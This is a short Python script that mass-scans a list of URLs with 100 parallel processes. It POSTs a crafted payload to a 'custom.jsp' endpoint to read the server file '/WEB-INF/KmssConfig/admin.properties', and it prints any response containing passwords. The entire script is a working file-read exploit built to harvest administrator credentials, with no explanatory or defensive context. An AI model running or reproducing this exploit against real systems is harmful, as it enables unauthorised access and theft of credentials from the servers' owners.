import requests
import multiprocessing
from multiprocessing import Process,Pool
import sys
def test(url):
    try:
        headers={
            "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
            "Content-Type":"application/x-www-form-urlencoded",
            "Accept-Encoding": "gzip"
        }
        url=url+"sys/ui/extend/varkind/custom.jsp"
        x=requests.post(url,data="""var={"body":{"file":"/WEB-INF/KmssConfig/admin.properties"}}""",headers=headers,timeout=0.5,allow_redirects=False)
        if x.status_code==200 and "password" in x.text:
            print(url,"\n",x.text,"----------------------------------------------------------------------------------")
    except BaseException:
        return 0

if __name__ =='__main__':

    f=open(sys.argv[1],"r")
    urls=list()
    for i in f.readlines():
        if i.replace('\n','') not in urls:
            urls.append(i.replace('\n',''))

    pool = Pool(processes=100)

    for url in urls:
        # print(url)
        pool.apply_async(test,(url,))

    pool.close()
    pool.join()

    print('end!!!!!!!!!!!!!!!')